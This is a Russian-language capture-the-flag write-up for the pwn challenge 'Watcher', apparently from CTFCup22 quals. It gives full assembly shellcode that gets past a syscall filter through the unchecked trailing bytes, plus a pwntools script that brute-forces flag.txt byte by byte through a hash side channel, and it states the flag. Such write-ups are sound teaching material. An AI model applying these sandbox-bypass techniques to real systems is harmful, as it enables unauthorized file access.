# Watcher

**Category:** Pwn

Решение разработчиков и исходники [тут](https://github.com/acisoru/ctfcup22-quals/blob/main/tasks/pwn/watcher/README.md)

# Решение

[Программа](https://github.com/acisoru/ctfcup22-quals/blob/main/tasks/pwn/watcher/dev/main.c) делает следующее:

1. Выделяет rwx память.
2. Читает в нее шеллкод. (без инструкций syscall, sysenter, int 80h).
3. Проверяет, чтоб в нем не было инструкций syscall, sysenter, int 80h, но не проверяет последние 6 байт.
4. Менят права выделенной память только на чтение и исполнение.
5. Получает sha256 хэш от шеллкода.
6. Создает дочерний процесс, который выполняет шеллкод. Родительский процесс пересчитывает хэш, и убивает дочерний процесс, если шеллкод был изменен.

[Шеллкод](/CTFCup22quals/watcher/solution/shellcode.asm):
```assembly
BITS 64

; nasm shellcode.asm -o s.bin

start:
	lea r15,[rel start+0x2000-0x100-6] ; adress of the syscall; jmp r12

; mprotect
	mov rax,10
	lea rdi,[rel start-6] ; start of the rx mapping
	mov rsi,0x2000
	mov rdx,7 ; rwx

	lea r12,[rel mprotect_return]
	jmp r15


mprotect_return:
; open
	mov rax,2
	lea rdi,[rel filename]
	mov rsi,0
	mov rdx, 0x1c0

	lea r12,[rel open_return]
	jmp r15


open_return:
; read
	mov rax,0
	mov rdi,0
	mov rdx,5 ; amount of bytes to read into the flag_buf (first 4 bytes are known "CUP{")
	lea rsi,[rel flag_buf]
	
	lea r12,[rel read_return]
	jmp r15


read_return:
	nop
	nop
	nop


filename:
	db 'flag.txt',0


flag_buf:
	db '#!@'

```

Шеллкод вызвыает `mprotect`, делая память снова rwx, и читает `flag.txt` в `flag_buf`(кол-во читаемых байт можно менять на 33 строчке). Если в `flag_buf` содержались такие же байты, что и в файле то хэш не изменится. Таким образом, можно перебирать по одному байту флага.

[Сплойт](/CTFCup22quals/watcher/solution/splo.py):

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0 --port 31337 watcher
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('watcher')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''

b *(0x0000555555554000+0x14af)
set follow-fork-mode child


'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

import string
import time

# CUP{0H_h1_M4rk!}

flag='CUP{'
tail=asm('syscall; jmp r12')

print('Looking for {}th character'.format(len(flag)+1))


last_found='' # !!! check found character several times during remote bruteforcing. Sometimes a server doesn't return "{-} Invalid hashes!" 

charset = string.printable if not last_found else string.printable[string.printable.index(last_found):]
for ch in charset:
    
    
    sc=open('s.bin','rb').read()[:-3] # strip #!@
    sc+=(flag+ch).encode()
    
    print(hexdump(sc))
    
    sc=sc.ljust(0x2000-0x100-6,b'\x90')
    sc+=tail
    


    io=start()
    io.recvuntil('{?} Enter your x86-64 code: ')
    io.send(sc)
    
    if not io.recvuntil('{-} Invalid hashes!\n',timeout=5):
        print('\n----------\n[*] Found next character:',ch,'\n----------\n')
        io.close()
        break
    else:
        io.close()
        




```
Флаг: `CUP{0H_h1_M4rk!}`